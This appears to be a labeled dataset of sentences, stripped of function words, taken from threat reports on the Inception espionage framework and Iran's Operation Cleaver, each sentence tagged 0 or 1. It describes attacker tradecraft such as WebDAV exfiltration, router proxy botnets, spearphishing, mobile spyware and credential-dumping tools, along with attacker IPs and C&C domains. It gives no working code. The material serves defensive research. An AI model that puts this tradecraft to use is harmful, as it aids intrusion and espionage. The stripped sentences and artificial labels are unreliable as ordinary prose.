Regardless whether registry launches DLL another malware executable starts DLL directly DLL launched using regsrv32.exe /s ( silent ) option	1
The names dropped files change attack attack	0
The one drops ctfmonrc.dll	1
Other names observed The encrypted data files named using random words apparently taken dictionary – '' acholias '' '' arzner '' '' bicorporate '' '' crockrell '' '' damnatorily '' etc	0
Looking one dropped dlls see authors originally called 95Num3P3gm.dll.polymorphed.dll	0
When executed rebuild original dll ( 95Num3p3gm.dll presumably ) load memory pass execution	1
It hard describe polymorphed dlls real depth little consistency	0
When two nearly identical dlls encoded using polymorphic scheme little code common	0
The call graphs different key functions varying number arguments	0
The polymorphing mechanism also generates inserts unique functions make calls different floating-point operations – done obfuscate actual decoding process	1
The sizes buffers allocated also randomized mask intent	0
What common somewhere along execution cycle one extremely large function ( 200 kb length ) early large allocation made un-obfuscated binary placed	0
The binary built de- obfuscating segments dispersed '.rdata ' section	0
The order size locations segments vary build build somewhere near end large function call subfunction loads PE image memory followed call free PE image allocation memory	1
Simply halting execution function call permits researcher extract reconstructed DLL memory	0
Here pausing execution call 'loadpefrommemory ' reveals extracted PE memory address pointed edx	0
This reconstructed DLL loaded decode configuration structure '.data ' section contains three important details name encrypted data file dropped VBScript ; AES key used decrypt file ; name unique global mutex hold running prevent multiple instances	0
This configuration information used load encrypted file memory decrypt	1
This turns yet another dll	0
The first ordinal exported dll located called passing configuration name encrypted file disk parameters	0
This last dll heart threat ( originally called q5Byo.dll instance	0
This file contains true intent campaign	0
It designed survey tool	1
The PE file gathers system information including OS version computer name user name user group membership process running locale ID 's well system drive volume information	1
All encrypted sent cloud storage via WebDAV	1
WebDAV communication standard allows file management HTTP HTTPS	0
Windows allows WebDAV sessions mapped network resources	0
The use WebDAV communication channel atypical malware samples see	0
By using network resource actual web traffic originates system process malware resides	0
Additionally resource established malware transfer files command control servers using standard file IO commands	1
All authentication information WebDAV session including URL folders path user name password stored within last DLL another AES-encrypted configuration structure binary	0
A unique path username password used malware instance 've seen wild	0
This allows attackers uniquely identify every targeted attack track successful phishing campaign	1
Also contained within configuration structure information name survey data remote file server	0
The binary reads configuration string generate remote filename list extensions use	0
An example would '' 1-7d0-8s '' [ '' TIF '' '' TAR '' '' SIT '' ] instructs binary generate filename 1 7 numeric digit characters followed 0 8 ASCII letters one three listed extensions '' 664gher.TAR ''	0
The survey uploaded server specified folder generated name	1
Files compressed using modified LZMA-compression encrypted using AES cipher-block-chaining ( CBC ) uploaded cloud server	1
The binary also checks separate folder cloud service designated contain new configuration information	1
If file present server malware downloads new configuration file deletes server	1
The cloud storage provider every case seen Swedish company CloudMe.com offers free paid WebDAV cloud storage	0
The URI model used malware http //webdav.cloudme.com/ % username % /CloudDrive/ direct reference file storage	0
It must noted CloudMe service actively spreading malicious content ; attackers using storing files	0
We notified CloudMe.com abuse services	0
Their CEO Mr. Daniel Arthursson none happy helpful research	0
CloudMe shared great deal log information related attack	0
These indicate many accounts ( 100 ) likely related attack system	0
We way verifying absolute certainty regard high confidence assumption	0
The cloud accounts used one-way communication	0
The malware also checks configured subfolders updates ; found downloaded decrypted used appropriate	1
One case franko7046 account used previously mentioned bank CEO	0
In account hidden another encrypted configuration file malware downloaded decrypted	1
This found depp3353 account	0
In new account another surprise waiting us – download folder two new encrypted files 921.bin 922.bin	0
Once decrypted turned PE executables	0
The two new executables plugins - quite similar obviously compiled setup	0
They lightweight intended pull specific survey information target	1
Of interest DLLs originally internal name ( 78wO13YrJ0cB.dll )	0
Presumably PE sanitization script parameters used	0
None plugins contain means CnC communication	0
Instead executed passed pointer function use sending data back home	1
Neither ever written disk	0
They executed memory completed memory freed	1
This makes modules extremely stealthy flexible compatible multiple toolsets independent CnC method used	0
921.bin retrieves several datapoints infected machine Domain info ; list running processes loaded modules ; list installed software ; complete hardware profile target machine	1
922.bin compiles dirwalk – complete listing every file path – fixed drive	1
All information exfiltrated back via WebDAV connection	1
This model makes possible intrusion steps verification stages ; files easily found affected computers	0
Based information gathered modules attackers appear move next stage attack placing new components WebDAV shares	0
Information uploads limited fact AES keys decrypt much uploaded data able see upload patterns	0
What assume third-stage plugins appear shares *.bin files roughly 72kb	0
As plugins downloaded deleted share one go	1
However next day another *.bin file size uploaded share	0
This pattern repeats live accounts	0
It seems plugins exist memory injected daily ensure persistence victim computers	1
Our theory malware typical datastealer observed type file planted account encrypted data uploads compromised users increase	1
Victims attack connect using Windows WebDAV redirector HTTP request user-agent string reflect	1
For Windows XP typically '' Microsoft-WebDAV-MiniRedir/5.1.2600 '' Windows 7 common user-agent '' Microsoft-WebDAV-MiniRedir/6.1.7601 ''	0
Security researchers – - connect variety ways ; first see number connections indistinguishable way victims connect	0
This happens researchers use lab machines live internet access run malware	0
The way tell researchers connect IP address ranges unlikely victims ; also tend consist short-lived sessions	0
Some researchers set scheduled tasks scan shares new updates malware	0
We see variations – one typical configuration requests contain Python-related user-agent string	0
Attackers hand n't appear use Windows	0
Common across multiple accounts multiple IP 's time probable attackers used HTTP user-agent '' davfs2/1.4.6 neon/0.29.6 ''	1
We know researchers see malware files uploaded We log fragment attackers uploaded sequential series updates ( 1746.bin 1774.bin ) within 1.5 hours Sept 17th spread 27 different accounts using 27 different IP addresses process	0
The user-agent string shows attackers likely used client based open source davfs2 file system Linux mount WebDAV shares	0
This client used uploading new malware also attackers scan shares new victim updates case shares enumerated requests scheduled manner	0
The attackers used large number IP addresses access shares	0
As mentioned rotation scheme place new IP address used minutes access CloudMe accounts	0
These IP 's distributed widely geographical locations service providers heavy bias towards South Korean ranges	0
At first thought IP 's belonged commercial proxy service particularly since several proxy services also offer IP rotation	0
However turned wrong assumption	0
A superficial examination proxy IP addresses connected CloudMe showed internet-connected devices various kinds	0
Many Korean Tera-EP home routers ; several products represented	0
It believed attackers able compromise devices based poor configurations default credentials	1
We able forensic work compromised Tera-EP TE-800 device discovered another dimension attacker 's infrastructure	0
Under ramfs mounted partition found stripped statically linked MIPS-el binary named tail-	0
Instances also found running process list	0
tail- serves SOCKS proxy attackers	1
Each sample binary able acquire configured unique 32byte blowfish key small encrypted section appended end binary	0
Upon execution binary uses hardcoded key decrypt configuration section retrieve listening port use incoming connections	1
This acts management interface	0
From attackers request specific port opened one following types SOCKET SOCKSS SOCKAT SOCKS5 STATUSPORT	0
To prevent anyone else accessing service communication management interface encrypted using blowfish key	0
This means attackers must maintain list implants installed well port key configured use	1
This setup makes difficult identify embedded devices compromised malware scanning open ports	0
In wild witnessed attackers connect management port request SOCKSS connections	0
This would open specified port wait configuration data consists domain name ( webdav.cloudme.com ) destination port variable length RC4 key encrypted using blowfish key	0
Once received malware would attempt connect domain name specified port would start tunneling traffic received SOCKSS port destination vise-versa	1
The communication attacker SOCKSS encoded using RC4 key	1
The graphic illustrates typical session	0
The router proxy network provides another layer indirection masking attackers ' infrastructure	0
However captured traffic one embedded devices could identify parts operation	0
We identified four IP addresses connected proxy malware This host belongs Bulgarian VPS service would use router proxy connect webdav.cloudme.com	1
This host scanning webdav shares stolen user data also uploads new malware components	1
This IP would make connections hourly poll status router proxy malware	0
This machine likely used track compromised routers currently available use	0
Traffic IP specific purpose It unlocked routers proxying connection sending phishing emails	1
In wild observed IP connect router malware management port specify SOCKSS proxy port opened	1
Immediately newly opened port would connected another IP used send phishing emails malicious attachments	1
However later observed Email sender IP VOLIA vanished Unlocker server taking role well	0
After router SOCKSS port opened Unlocker IP would connect opened port tunnel email traffic router	1
Each connections used correct encryption key know accesses came attackers opportunistic third party	0
Mail proxies Through router monitoring identified two mail proxies used attackers	1
We later notified Symantec ( thanks guys ) third	0
These servers hosted domains registered attackers using domain names clearly meant look legitimate	0
This time seen attackers register domains investigation	0
The mail proxies Registrant WHOIS information seems forged The connections made Ukrainian host router interesting	0
After proxied though router would authenticate one dedicated mail proxies send phishing attacks	1
From captured traffic appears mail proxies SOCKSv5 services running obscure high ports	0
We documented attackers log using apparently randomly generated usernames passwords unique pair server	0
The mail proxy would relay spearphishing mail seen	1
This way attack mistaken come legitimate businesses trusted organizations	1
In cases organization phishing email originates would appear known associate target	1
The email shown one number messages sent targets oil industry	1
Investigating target email addresses saw several found public document World Petroleum Council including addresses present time longer valid	0
And ground shifted	0
One spearphishing mails observed coming router network one sent address gov.py ( Government Paraguay ) domain	1
There executable attachment mail instead link shortened URL shortener service bit.ly underlying link pointing IP address Dutch hosting service	0
Clicking link Windows PC yielded redirection BBC homepages using devices give data	0
The bit.ly service however provide information user creating shortened link links associated account	0
In case user named nicolatesla53	0
The nicolatesla53 account created July 2014	0
From Oct 24th Nov 21st user created nearly 10000 shortened links – harvested 9990 unique ones	0
Three IP addresses used links The links format As far able tell three main types actioncode We sample actual MMS phishing messages apparently sent see page served user clicks spammed link	0
This dialogue box asking password presumably included initial message next stage likely involves download malicious content	0
We middle harvesting servers data various action codes abruptly taken offline ; data mobile operators targeted complete	0
We managed get 66 total 190	0
The ones know shown	0
A full breakdown mobile operators related links included appendix	0
The composition links created various mobile operators quite interesting one speculate represent amount actual planned attacks different countries	0
With top three operators Vodafone T- Mobile Proximus ( Belgacom ) seems apparent phishing attacks less focused Russian sphere previously discussed malware	0
This map complete though	0
It represents 35 % ( 66/190 ) mobile operators targeted 66 % ( 3152/4781 ) phishing links managed harvest	0
In addition operators like Vodafone global actors map might show unfair intensity HQ locations	0
The rest bit.ly links used action codes 743 1024	0
And things really get interesting	0
By using mobile device HTTP User-Agents able trigger downloads malware components links	0
Accessing link Android User-Agent initiated download Android installer package named WhatsAppUpdate.apk	1
The package analyzed 1.2MB size	0
The apparent main purpose malware record phone call audio	1
Recordings stored *.mp4 files uploaded attackers periodically	1
The malware able collect lot information actually used Through encrypted C & C protocol attackers issue commands binary updates malware	1
It uses custom DAO/Database scheme uses accounts belonging virtual community Live Journal ( livejournal.com ) data stores	0
Three accounts found hardcoded package The accounts state belong Iranian users	0
This likely false	0
The text posts starts first cleartext quickly turns unreadable gibberish	0
The HTML source code reveals encoded portion encapsulated blog-index tags The three accounts contain different configuration blocks pointing C & C servers apparently located Poland Germany Russia respectively	1
Based registration data folder configuration believe legitimate compromised Joomla servers	0
And unexpected oddity shows Java source We also able download similar malware sample ( BrowserUpdate.apk ) one C & C servers	0
This sample used different online accounts DAO/database functionality otherwise quite similar first	0
Using IOS User-Agent triggered download Debian installer package WhatsAppUpdate.deb also 1.2Mb size	1
This application impersonates Cydia installer installed jailbroken phone	1
Once installed may collect These data encrypted uploaded FTP account taken encrypted configuration file named /usr/bin/cores	1
In particular case FTP account located legitimate ( struggling ) hosting service UK	0
In case 's another clue The WhatsAppUpdate project seems derived earlier template named SkypeUpdate	0
By came surprise triggered download BlackBerry User-Agent	0
The initial download Java Applications Descriptor text file designed Over-The-Air installation Java-based applications	0
This JAD file contained locations two Blackberry *.COD binaries could download directly	0
The application impersonates settings utility	1
This collects Collected data uploaded DynDNS domain currently hosted US webhosting service	1
Since COD files also compiled Java code possible decompile original source code	0
In similar fashion Android version find interesting strings	0
This time Arabic The earliest sample Inception-related malware able obtain submitted us June 2014	0
However decoy document metadata shows created late May	0
The related cloud account created	0
An examination documents associated attacks show created steady pace summer autumn 2014 attacks still ongoing	0
Of interest also attackers ' activity patterns 24h cycle	0
The main upload new components shares seems divided two high–activity periods 6:00 -10:00 UTC 17:00 - 21:00 UTC	0
No uploads seen 23:00 05:00 UTC	0
It however doubtful indicative timeframes	0
To illustrate looked another obscure timing factor The timing AES InitVector random seeds	0
A random seed initial value passed pseudo-randomizer function	0
The malware uses random output create known InitVector - starting point AES encryption/decryption function	0
The code used DLLs indicate attackers tend use C time ( ) function generate random seeds	0
This function returns values granularity seconds	0
Thus random seeds ultimately InitVectors functions quite coarse units time	0
The encrypted files uploaded WebDAV shares come InitVectors stored end file	1
Since know time window within days upload time able brute force time values would generate corresponding InitVectors	0
Thus able say second file created – times identified range 1500 - 2200 GMT	0
Unfortunately reject data	0
The file creation times turned hours files uploaded WebDAV share	1
Either attackers ' system clock wrong fixed offset added random seed	0
Either way data ca n't trusted ; shows nothing taken face value	0
On least two occasions surveillance Inception framework malware downloaded something unexpected wholly different discussed	1
These files downloaded encrypted *.bin files accounts carter0648 frogs6352	1
When decrypted turned dropper packages containing one dropper executable clearly created Inception framework one different executable	1
This executable ( sccm.exe md5 dd8790455109497d49c2fa2442cf16f7 ) classical Chinese APT implant	0
It downloader remote shell program designed connect C & C server interact attacker and/or download malware	1
The C & C server case ict32.msname.org	1
When connecting server sccm.exe issues following request This C & C domain used many malwares related sccm.exe ; share obvious connections Quarian malware family known APT intrusion tool	1
This development unexpected several reasons	0
First apparently breaks strict obfuscatory operational security built Inception framework	0
Inception capacity perform steps needed scouting exfiltrating data without resorting traditional hosted command & control	1
By using well-understood APT tool known malicious C & C domain name attackers permit much clearer attribution	1
Another factor character coding style	0
All Inception-related malware written using Visual Studio 2010	0
The downloaded sccm.exe written using Visual C++ 6 ; PE header compile date October 2010	0
This date forged indeed Inception-related malware level forgery compile dates	0
However sccm.exe compile date matches Quarian developer toolset coding style better degree files distributed Inception	0
Then C & C domain used	1
According DomainTools.com msname.org domain registration timed September 27th 2014	0
It left inactive renewed Nov 12th	0
This means attackers distributed malware would action long time ( last distribution sccm.exe September 26th )	0
Because consider sccm.exe unreliable indicator	0
It likely red herring purposefully placed shares attackers seen signs access security researchers	0
At one instance attackers seem slipped	0
Instead using scheduled task apparently something manually WebDAV share	0
This visible request came apparent attacker IP used yet another User-Agent '' gvfs/1.12.3 ''	0
Gvfs virtual filesystem Gnome desktop	0
The action account abnormal well ; apparent file upload When WebDAV shares mapped drives operating system action taken attacker follows pattern attacker 's local drive	0
In case seems attacker attempted edit new document default given name '' Untitled document '' Gnome	0
This might indicate attacker 's operating system language Spanish	0
Of course Spanish one world 's widespread languages one infer much	0
There even small possibility phenomenon pure artifact ; example Spanish-speaking researcher connected account using Linux-based setup attackers	0
This attack system shares number properties somewhat similar Red October campaigns detailed Kaspersky Labs 2013	0
For information see The '' Red October '' Campaign - An Advanced Cyber Espionage Network Targeting Diplomatic Government Agencies However also clear differences	0
The code fully rewritten ; appears little code overlap least initial stage malware	0
The coding style different different solutions programmatic problems different use exception handling different use C++ classes	0
It 's hard believe programmers responsible two code bases	0
The Red October malware contained linguistic markers pointed towards Russian speaking attackers	0
No clues found Inception- related malware ; marked difference attention detail information leakage	0
It certainly possible people organized Inception Red October clear indications effect	0
The Windows-based malware paper generally contains noticeable strings apart commonly found software clearly randomized strings	0
What exists – like word '' polymorphed '' early DLL versions - standard English discerning features	0
This changes bit look mobile malware	0
In Android malware find Hindi comments Java source code	0
In Iphone malware find project paths referencing one '' JohnClerk '' typos like '' conutry ''	0
In one Blackberry binaries find string '' GodSaveTheQueen '' rather blunt hint towards Britain well Arabic log strings	0
These indicators led us conclude Inception attackers setting new standard deliberate disinformation red herrings malware espionage operation	0
Some clues might added accident none indicators trusted way	0
Thus going assume anything might behind attacks	0
The whole Inception setup shows signs automation seasoned programming	0
The amount layers used scheme protect payload attack seems excessively paranoid	0
Not initial DLL apparently polymorphed using backend tool – compile time stamps PE header clearly forged resources removed give away location information import tables shuffled around rendering import hashes ( aka imphashes ) useless	1
The names files dropped original names along callback directories paths mutexes used seem dynamically generated	0
The attackers utilize compromised embedded devices – typically routers- Internet well multiple dedicated hosting providers VPN services mask identity cloud storage provider others	1
The router botnet used spreading management platform attacks mobile devices well	1
This suggests large campaign 've seeing beginning	0
Initially many targets located Russia related Russian interests campaign evolved verified targets countries world	0
It clear infrastructure model need applied solely targets even need hosted CloudMe	0
The framework generic work attack platform multitude purposes little modification	0
The attribution indicators point different directions ca n't given much weight	0
These attacks theory creation nation states resourceful private entities - consider unlikely performed one individuals	0
haarmannsi.cz sanygroup.co.uk ecolines.es blackberry-support.herokuapp.com ( DynDNS ) The following entities helped big small ways	0
Big thanks	0
We also owe big debt gratitude Ryan W. Smith Blue Coat helped us tremendously analysis mobile malware	0
A personal note Cylance CEO Stuart McClure On February 24 1989 United Flight 811 left Honolulu Hawaii way Auckland New Zealand 364 souls board	0
Somewhere 23,000 24,000 feet enormous explosion ejected nine passengers dark void Pacific Ocean	0
This aviation disaster later determined caused simple design flaw combined lack corrective action	0
Boeing FAA known problem one year prior accident	0
The result nine people lost lives	0
The 337 passengers plus 18 crew members survived live memory every day ; due highly preventable design flaw	0
As 19-year-old young adult I grateful survived I idea single event would impact future profound way	0
Much passion cybersecurity directly attributed fateful day	0
The United Flight 811 accident proves important detect flaws tragedy strikes	0
Preventable disasters like motivates Cylance team create safer world	0
We everything uncover flaws technologies damage physical cyber world	0
Our mission simple protect world	0
This report attempt deliver mission	0
After tracking hackers personally professionally 26 years doubt mind release information contained Operation Cleaver report vital security world's critical infrastructure	0
The focus Operation Cleaver report one particular Iranian team 've dubbed Tarh Andishan infrastructure utilize well tactics techniques procedures	0
Roughly translated '' Tarh Andishan '' means '' thinkers '' '' innovators ''	0
This team displays evolved skillset uses complex infrastructure perform attacks espionage theft potential destruction control systems networks	0
While investigation ongoing presently limited visibility inside many compromised networks Cylance observed Tarh Andishan actively targeting attacking compromising 50 victims since least 2012	0
Cylance committed responsible disclosure refrained exaggeration embellishment report limiting content definitively confirmed	0
However speculated possible motivations behind attacks given deep knowledge understanding cyber landscape	0
We made every effort notify affected entities prior publishing report	0
Additionally personally identifiable information members Operation Cleaver withheld	0
We n't care adversary work reside 're dating party photos upload Facebook – care preventing campaigns like Operation Cleaver negatively affecting real world	0
This report world 's cyber defenders – never give Since least 2012 Iranian actors directly attacked established persistence extracted highly sensitive materials networks government agencies major critical infrastructure companies following countries Canada China England France Germany India Israel Kuwait Mexico Pakistan Qatar Saudi Arabia South Korea Turkey United Arab Emirates United States	1
Iran new China	0
Operation Cleaver past several years conducted significant global surveillance infiltration campaign	1
To date successfully evaded detection existing security technologies	1
The group believed work Tehran Iran although auxiliary team members identified locations including Netherlands Canada UK	0
The group successfully leveraged publicly available customized tools attack compromise targets around globe	0
The targets include military oil gas energy utilities transportation airlines airports hospitals telecommunications technology education aerospace Defense Industrial Base ( DIB ) chemical companies governments	0
During intense intelligence gathering last 24 months observed technical capabilities Operation Cleaver team rapidly evolve faster previously observed Iranian effort	0
As Iran 's cyber warfare capabilities continue morph probability attack could impact physical world national global level rapidly increasing	0
Their capabilities advanced beyond simple website defacements Distributed Denial Service ( DDoS ) attacks Hacking Exposed style techniques	0
With minimal separation private companies Iranian government modus operandi seems clear blur line legitimate engineering companies state- sponsored cyber hacking teams establish foothold world 's critical infrastructure	0
Iran 's rising expertise along choice victims compelled us release report sooner would liked order expose Operation Cleaver world	0
The evidence indicators compromise provide report allow potentially unaware victims detect eliminate Cleaver 's incursions networks	0
Iran severely impacted debilitating extremely advanced malware campaigns since least 2009	0
Famous examples efforts include industrial sabotage via Stuxnet ( 2009 - 2010 ) espionage Duqu ( 2009 - 2011 ) well Flame ( 2012 )	1
These campaigns targeted Iran's nuclear program oil gas operations	0
Stuxnet eye-opening event Iranian authorities exposing world physical destruction via electronic means	1
Hacking campaigns sourced Iran nothing new	0
Since early 2000 's information security industry whole tracked teams like Iranian Cyber Army mainly focuses patriotic hacking ( website defacements )	0
After release Stuxnet Iran 's motivations appear shifted	0
Retaliation Stuxnet began almost immediately 2011 campaigns like certificate compromises Comodo DigiNotar	0
These attacks served warning showcasing rapid evolution Iran 's hacking skills	0
A major retaliation came form 2012 's Shamoon campaign impacted RasGas Saudi Aramco	0
It 's estimated Shamoon impacted 30,000 computer endpoints cost affected companies tens-of-thousands hours recovering attacks	0
The direct financial impact retaliation amount downtime experienced staggering	0
Shamoon truly watershed event security defenders	0
It first glimpse real capabillity intention Iranian cyber operations	0
We see motivation intent Operation Cleaver establishing beachhead cyber sabotage	0
We saw Iranian backlash late 2012 early 2013 form Operation Ababil's Distributed Denial Service ( DDoS ) attacks US banks	0
These attacks debilitating impacted availability online banking services	1
Yet backlash witnessed FireEye's exposure Operation Saffron Rose espionage campaign executed Ajax Security Team 2014	0
In May 2014 evidence emerged highly targeted waterhole attack leveraged social media dubbed Operation Newscaster uncovered iSight Partners	1
In June 2013 Israeli Prime Minister Benjamin Netanyahu accused Iran carrying '' non-stop '' attacks '' [ Israel 's ] vital national systems '' including '' water power banking ''	0
The following September 2013 Wall Street Journal accused Iran hacking unclassified U.S. Navy computers San Diego 's NMCI ( Navy Marine Corp Intranet ) ,5 confirm part Operation Cleaver	0
While previously reported operations attributed Iran largely focused Defense Industrial Base ( DIB ) companies United States Federal Government targets Middle Eastern countries Operation Cleaver instead focused wide array targets including energy producers utilities commercial airlines airports military intelligence aerospace hospitals even universities – ten targets based United States	0
Such broad targeting demonstrates world Iran longer content retaliate US Israel alone	0
They bigger intentions position impact critical infrastructure globally	0
The string cleaver found several times variety custom software used Operation Cleaver including We believe visibility campaign represents fraction Operation Cleaver 's full scope	0
We believe operation left continue unabated matter time world 's physical safety impacted	0
While disclosure information detriment ability track activity group allow security industry whole defend threat	0
As exposing cyber campaign early attempt minimize additional real-world impact prevent victimization	0
• Persian hacker names used throughout campaign including Salman Ghazikhani Bahman Mohebbi Kaj Parviz Alireza numerous others	0
• Numerous domains used campaign registered Iran	0
• Infrastructure leveraged attack registered Iran corporate entity Tarh Andishan translates '' invention '' '' innovation '' Farsi	0
• Source netblocks ASNs registered Iran	0
• Hacker tools warn external IP address traces back Iran	0
• The infrastructure hosted Netafraz.com Iranian provider Isfahan Iran	0
• The infrastructure utilized campaign significant lone individual small group	0
We believe work sponsored Iran	0
• US Military targets including NMCI October 2013	0
Confirmed targeting global government entities	0
• Networks systems targeted critical industries like energy utilities oil gas chemical companies	0
• Assets ( cyber physical ) logistics information compromised major airline operators airports transportation companies	1
• Various global telecommunications technology healthcare aerospace defense companies breached part operation	0
• Confidential critical infrastructure documents harvested major educational institutions around world	1
• Initial compromise techniques include SQL injection web attacks creative deception- based attacks – implemented past Chinese Russian hacking teams	1
• Pivoting exploitation techniques leveraged existing public exploits MS08-067 Windows privilege escalations coupled automated worm-like propagation mechanisms	1
• Customized private tools functions include ARP poisoning encryption credential dumping ASP.NET shells web backdoors process enumeration WMI querying HTTP SMB communications network interface sniffing keystroke logging	1
• The ability build customized tools compromise target choose	0
• Private signing certificates one victim captured allowing Operation Cleaver team compromise entirety organization	1
• Over past two years Cylance collected 8GB data including 80,000 files exfiltrated data hacker tools victim logs highly sensitive reconnaissance data	0
• Data sinkholed command control servers allowed us track active campaign	0
• Cylance releasing 150 IOCs samples associated Cleaver campaign empower security community detect existing compromises organizations well potentially block future attacks teams	0
• This campaign continues Iran 's retaliation Stuxnet Duqu Flame	0
• This state-sponsored campaign	0
• There possibility campaign could affect airline passenger safety	0
• This campaign 's intentions may damage Industrial Control Systems ( ICS ) Supervisory Control Data Acquisition ( SCADA ) systems impact Critical Infrastructure Key Resources ( CIKR )	0
• This campaign could way demonstrate Iran 's cyber capabilities additional geopolitical leverage due breadth depth global targets	0
• There intense focus CIKR companies South Korea could give Iran additional clout burgeoning partnership North Korea	0
In September 2012 Iran signed extensive agreement technology cooperation agreement North Korea would allow collaboration various efforts including IT security	0
• Iran recruiting within universities potentially using 'hackers hire '	0
The Cleaver team targets sensitive global critical infrastructure companies world including military oil gas airlines airports energy producers utilities transportation healthcare telecommunications technology manufacturing education aerospace Defense Industrial Base ( DIB ) chemical companies governments	0
Countries impacted include Canada China England France Germany India Israel Kuwait Mexico Pakistan Qatar Saudi Arabia South Korea Turkey United Arab Emirates US	0
The following breakdown country industries targeted and/or victimized Cleaver 's level access organization varied greatly including completely compromised systems networks Active Directory domain controllers credentials compromised data repositories stolen VPN credentials	1
Compromised systems include Microsoft Windows web servers running IIS ColdFusion Apache PHP many variants Microsoft Windows desktops servers Linux servers	1
Compromised network infrastructure included Cisco VPNs well Cisco switches routers	1
Unlike Stuxnet exotic exploitations ( 0-days ) observed	0
Within investigation direct evidence successful compromise specific Industrial Control Systems ( ICS ) Supervisory Control Data Acquisition ( SCADA ) networks Cleaver exfiltrate extremely sensitive data many critical infrastructure companies allowing directly affect systems run	1
This data could enable affiliated organizations target potentially sabotage ICS SCADA environments ease	1
We discovered 50 victims investigation distributed around globe	0
Ten victims headquartered US include major airline medical university energy company specializing natural gas production automobile manufacturer large defense contractor major military installation	0
The four targets Israel five targets Pakistan comprised education aerospace airports airlines healthcare technology	0
Further victims identified numerous Middle Eastern countries well ones Northern Europe including UK France Germany	0
Central America immune either large oil gas company list	0
In fact oil gas particular focal point Cleaver team going less nine companies around world	0
Universities targeted US India Israel South Korea	0
The attackers targeted research efforts student information student housing financial aid systems	1
They penchant pictures passports specifc identifying information	0
Perhaps bone-chilling evidence collected campaign targeting compromise transportation networks systems airlines airports South Korea Saudi Arabia Pakistan	0
The level access seemed ubiquitous Active Directory domains fully compromised along entire Cisco Edge switches routers internal networking infrastructure	1
Fully compromised VPN credentials meant entire remote access infrastructure supply chain control Cleaver team allowing permanent persistence compromised credentials	1
They achieved complete access airport gates security control systems potentially allowing spoof gate credentials	1
They gained access PayPal Go Daddy credentials allowing make fraudulent purchases allowed unfettered access victim 's domains	1
We witnessed shocking amount access deepest parts companies airports operate	0
Despite today 's trend toward attacker attribution believe offers little real benefit day-to-day cyber defender	0
However report offer observations sources Operation Cleaver order benefit rely attribution Law Enforcement	0
Operation Cleaver believed consist least 20 hackers developers collaborating projects missions support Iranian interests	0
Many targets predominately English-speaking majority team members capable reading writing English	0
We present evidence team operating least part Iran interests Iran	0
The skills behavior Operation Cleaver teams consistent one case surpasses Iran 's cyber capabilities know today	0
For complete list IPs domains related campaign please refer Indicators Compromise section	0
Over course multiple incident response engagements related Operation Cleaver able identify small set IP addresses commonly used initial stages attack	1
The IP address 78.109.194.114 served source one primary attackers	1
They observed conducting SQL injections controlling backdoors well exfiltrating information using address address appears multiple software configurations recovered staging servers period time	1
This IP address also observed multiple software configurations	0
This particular net block used extended period time indicating Cleaver team's physical control	0
Additionally prior netblocks used team demonstrated us n't simply case proxying '' island hopping ''	0
For information see Tarh Andishan section report	0
The IP address 159.253.144.209 source secondary attacker various compromises	1
They observed conducting SQL injection attacks	1
While IP registered Netherlands believe used Softlayer 's Citrix demo environment launch attacks consistent proxying '' island hopping ''	0
A number Cleaver 's attack methods require persistent server	0
In many cases servers referenced domain names	0
The following malicious domains operated organization grouped registrant 's email address	0
As typical malicious domains Whois data domains contained falsified information	0
We managed obtain large collection internally developed tools used Cleaver team many developed members	0
Due operational security failures tools contain information provided us insight organization operations	0
In tool named Shell Creator 2 three main components	0
The creator generates ASPX web shell using user input well collection templates	1
The web shell could installed via xpcmdshell method would grant attacker write access	1
The web shell accessible shell client directly	0
The shell client portion Shell Creator 2 designed run compromised computer	0
We originally located staging server utilized multiple attacks well tool sharing data members organization 's team	1
The shell client developed Java easily decompiled simple interface feature protect operator making critical mistake	0
When executed connection instance web shell initiated shell client communicates freegeoip.net order get external IP address current user	1
The country origin shown user inform country appears connecting	0
The assumed purpose feature ensure proper proxy use real origin attacker revealed	0
After decompiling shell client found following code segment controlling display IP location information	0
This code handles XML response freegeoip.net displays information different colors based different attributes	0
For instance string '' ERROR '' response text displayed color magenta	0
If string IRAN response text displayed color red	0
It noted country name contains substring IRAN	0
Net Crawler tool developed C # exhibits worm-like behavior order gather cached credentials accessible computers infected network	1
This done Windows Credential Editor ( WCE ) Mimikatz combination PsExec	0
Different versions malware contain ASCII art names authoring group Zhoupin ( '' leetspeak '' '' Zh0up n '' )	0
For information Net Crawler see Tactics Techniques Procedures section	0
TinyZBot bot written C # developed Cleaver team	0
It longest developed malware family discovered group used campaigns close two years	0
How operates vary greatly version version	0
For detailed technical analysis TinyZBot see Tactics Techniques Procedures section	0
As TinyZBot developed C # many versions decompiled code similar originals including names namespaces	0
Many versions obfuscated legitimate tool developers named SmartAssembly makes recovery names implausible	1
We obtained multiple versions able recover many original names variables namespaces	0
In number samples primary namespace TinyZBot named ZhoupinCleaver	0
In every version TinyZBot obfuscated code base referred Cleaver	0
This code base also shared malware developed organization Csext	0
PrivEsc blatant plagiarism existing exploit Microsoft Windows released January 2010 called MS10-015 '' Vulnerabilities Windows Kernel Could Allow Escalation Privilege '' popularly known KiTrap0D exploit released publicly	0
The Cleaver team clearly modified source code compiled new version	0
The detectable modification change original author 's name instead display following Zhopin Exploit Team This case team relabeling others ' work	0
Logger module component PVZ ( PVZ shorthand Parviz one members Cleaver team ) bot tool chain	0
When executed capture user 's keystrokes save location PVZ bot exfiltrates	1
The logger module binary 's file description value following Roughly translated Persian text says This text could potentially note intended stay internal could attempt persuade unsuspecting victim assume file malicious	0
The Product Name value GOOD FILE	0
For information PVZ bot tool chain see Tactics Techniques Procedures section	0
CCProxy publicly available proxy server Windows handle variety protocols	0
We believe organization involved development modification CCProxy observed using	0
We recovered CCProxy configuration exposed various operational details	0
The configuration allowed remote connections limited username well limited IP range	0
The username User-001 default value	0
The limited IP range covered one IP 78.109.194.114	0
This IP address located Iran owned Tarh Andishan	0
The configuration also indicates address CCProxy server listen incoming connections web ( 80 ) mail ( 25 )	0
Log output network port scanning application NMAP recovered staging server	0
This log generated usage nbrute utility brute-forces network credentials relies NMAP	1
The header NMAP log indicates computer used run nbrute/nmap set Iran Daylight Time time execution	0
With known victims located Iran likely executed attacker 's computer victim 's computer	0
A configuration file Squid proxy server recovered	0
Figure 12 Squid configuration file showing use Tarh Andishan 's IP address	0
The net range 78.109.194.114/28 inserted allowed local networks RFC comment appended order make look like part default configuration	0
It likely reason /28 net range used order look like intended allow one IP	0
This would give access resources accessible Squid proxy server Iranian IP address	0
Tarh Andishan listed registrant number small net blocks based upon email address tarh.andishan ( ) yahoo.com	0
The net blocks appear rotate time registrant information altered accommodate ongoing operations avoid potential public exposure	0
The networks included well last time net block observed active	0
